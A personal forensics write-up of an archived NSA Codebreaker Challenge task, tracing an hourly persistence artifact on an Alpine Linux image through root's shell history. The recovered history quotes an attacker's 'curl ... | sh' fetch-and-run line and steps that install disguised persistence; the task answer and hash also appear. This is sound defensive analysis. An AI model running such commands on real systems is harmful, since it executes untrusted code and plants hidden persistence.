---
title: "Task 01 - Suspicious Artifact"
layout: "Notes"
overview: "Retrospective analysis of an archived CBC 2025 EXT2 image, identifying an hourly persistence artifact from shell history."
status: "Draft complete"
---

## Context

I did not compete in the 2025 NSA Codebreaker Challenge. I worked through this archived task while preparing for CBC 2026, using the released task files and solution material to practice a filesystem-forensics workflow.

The scenario provides a zipped EXT2 image from a development workstation exhibiting suspicious behavior. The goal is to examine the filesystem and identify the malicious artifact.

## Mounting the image safely

I mounted the EXT2 image read-only so my analysis would not change its contents or timestamps:

```sh
sudo mkdir -p /mnt/T1
sudo mount -t ext2 -o loop,ro image.ext2 /mnt/T1
```

## Checking the timestamps

I began by using `find` and `stat` to inspect each file's modification, access, and metadata-change times:

```sh
find /mnt/T1 -exec stat -c "%y %x %z %n" {} + | sort
```

![Filesystem entries showing timestamps at the Unix epoch.](/images/nsa-cbc-25/task-01/epoch-timestamps.png)

Many entries resolved to December 31, 1969 in my local timezone. In Unix time, a value of zero represents the start of January 1, 1970 UTC; the timezone offset accounts for the previous-day display. Seeing that value across the filesystem suggests the timestamps were deliberately reset or stripped, so they could not provide a trustworthy activity timeline.

The directory structure and installed files also identified the system as Alpine Linux with nginx and OpenRC.

I then narrowed the search to executable files and sorted them by their numeric modification time:

```sh
find /mnt/T1 -type f -executable -exec stat -c "%Y %n" {} + | sort -nr | head -n 20
```

![Executable files also reporting zero-valued modification timestamps.](/images/nsa-cbc-25/task-01/executable-timestamps.png)

The executables also reported zero-valued timestamps. This reinforced the timestamp anomaly but did not identify one malicious file by itself.

## Following the shell history

Because the timestamps were unreliable, root's shell history was a better record of what had happened. The history contained routine administration commands mixed with a much more suspicious installation sequence.

![Overview of commands recovered from the shell history.](/images/nsa-cbc-25/task-01/shell-history-overview.png)

I searched for shell-script references and included the surrounding lines:

```sh
sudo grep -i -C 15 "\.sh" /mnt/T1/root/.bash_history
```

That exposed the following commands. The block is preserved without inline comments so it matches the recovered history:

```sh
curl http://127.0.0.1
exit
id
cd /tmp
curl http://127.0.0.1:10000/a/get.sh | sh
tar xf t.tar
cp c /etc/periodic/hourly/uzxwsmnerc
cp a /bin/console
cp b /etc/runlevels/default/console
rm -f a
ls
rm -f ./b ./c
ls
/bin/console -s
ps
chmod +x /bin/console
/bin/console -s
ps | grep con
kill 1020
/bin/console -s -o /etc/periodic/hourly/uzxwsmnerc
ps
exit
```

![The suspicious portion of root's recovered command history.](/images/nsa-cbc-25/task-01/suspicious-history-sequence.png)

In basic terms, the commands do the following:

1. Change to `/tmp`, download `get.sh` from a service listening on local port 10000, and immediately execute it with `sh`.
2. Extract `t.tar`, which produces the short staging files `a`, `b`, and `c`.
3. Copy `c` to `/etc/periodic/hourly/uzxwsmnerc`. Alpine runs scripts in this directory every hour, giving the artifact a persistence mechanism.
4. Copy `a` to `/bin/console` and `b` to the default OpenRC runlevel, disguising the installed components behind a normal-looking name and arranging another startup-related entry.
5. Delete the staging files, run `/bin/console`, inspect its process, change its executable permission, and terminate process 1020.
6. Run `/bin/console` again with `/etc/periodic/hourly/uzxwsmnerc` as its `-o` target, directly associating the new executable with the hourly artifact.

The most dangerous-looking line is the download pipeline: `curl ... | sh` sends downloaded text straight into a shell without first saving or reviewing it. In this image, the commands that follow show exactly what that installation changed.

## Confirming the artifact

The hourly directory contained the randomly named file from the history:

```sh
cd /mnt/T1/etc/periodic/hourly
ls
cat uzxwsmnerc
sha1sum uzxwsmnerc
```

The file contains three configuration-style variables, including a path under `/app/www`. Its short contents are less important than the surrounding evidence: root's history records its installation, its location makes it run hourly, and `/bin/console` was invoked with the same path as an output target.

![Contents and SHA-1 hash of the suspicious hourly artifact.](/images/nsa-cbc-25/task-01/artifact-hash.png)

## Answer

The suspicious artifact is:

```text
/etc/periodic/hourly/uzxwsmnerc
```

The requested SHA-1 value is:

```text
9131dc1a3bd542c99db5dd1e1ec2644d9113a895
```

The archived solutions confirm this identification.
